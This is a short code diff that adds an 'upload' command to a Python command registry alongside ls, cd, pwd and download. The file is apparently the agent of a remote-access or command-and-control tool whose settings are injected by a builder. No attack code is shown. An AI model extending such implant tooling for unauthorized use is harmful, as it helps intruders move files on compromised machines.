@@ -17,6 +17,7 @@ from commands import ls as cmd_ls
 from commands import cd as cmd_cd
 from commands import pwd as cmd_pwd
 from commands import download as cmd_download
+from commands import upload as cmd_upload
 
 
 # --- Injected by builder via string substitution ---
@@ -111,6 +112,7 @@ COMMANDS = {
     "cd":    cmd_cd.execute,
     "pwd":      cmd_pwd.execute,
     "download": cmd_download.execute,
+    "upload":   cmd_upload.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
